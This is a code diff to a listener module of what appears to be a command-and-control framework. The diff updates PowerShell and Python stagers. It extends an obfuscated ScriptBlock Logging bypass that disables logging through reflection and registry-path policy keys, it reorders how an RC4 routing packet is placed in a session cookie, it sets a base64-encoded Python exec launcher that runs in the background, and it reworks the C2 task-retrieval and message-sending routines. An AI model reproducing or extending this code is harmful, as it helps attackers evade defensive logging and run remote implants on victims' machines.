@@ -139,16 +139,23 @@ class Listener:
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
 
                     # ScriptBlock Logging bypass
-                    stager += helpers.randomize_capitalization("$GPS=[ref].Assembly.GetType(")
+                    stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
                     stager += "'System.Management.Automation.Utils'"
                     stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
                     stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(").GetValue($null);If($GPS")
+                    stager += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
                     stager += "['ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("){$GPS")
+                    stager += helpers.randomize_capitalization("){$GPC")
                     stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
-                    stager += helpers.randomize_capitalization("$GPS")
+                    stager += helpers.randomize_capitalization("$GPC")
                     stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
+                    stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
+                    stager += "('EnableScriptB'+'lockLogging',0);"
+                    stager += helpers.randomize_capitalization("$val.Add")
+                    stager += "('EnableScriptBlockInvocationLogging',0);"
+                    stager += helpers.randomize_capitalization("$GPC")
+                    stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
+                    stager += helpers.randomize_capitalization("=$val}")
                     stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
                     stager += "'signatures','N'+'onPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
@@ -262,8 +269,6 @@ class Listener:
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
-                # add the RC4 packet to a cookie
-                launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
                 launcherBase += "import urllib2\n"
 
                 if proxy.lower() != "none":
@@ -287,6 +292,9 @@ class Listener:
                 else:
                     launcherBase += "o = urllib2.build_opener();\n"
 
+                # add the RC4 packet to a cookie
+                launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
+                
                 #install proxy and creds globally, so they can be used with urlopen.
                 launcherBase += "urllib2.install_opener(o);\n"
 
@@ -311,7 +319,7 @@ class Listener:
 
                 if encode:
                     launchEncoded = base64.b64encode(launcherBase)
-                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
+                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (launchEncoded)
                     return launcher
                 else:
                     return launcherBase
@@ -356,7 +364,7 @@ class Listener:
                 """ % (listenerOptions['Host']['Value'])
 
                 getTask = """
-                    function script:Get-Task {
+                    $script:GetTask = {
 
                         try {
                             if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {
@@ -392,7 +400,7 @@ class Listener:
                 """
 
                 sendMessage = """
-                    function script:Send-Message {
+                    $script:SendMessage = {
                         param($Packets)
 
                         if($Packets) {
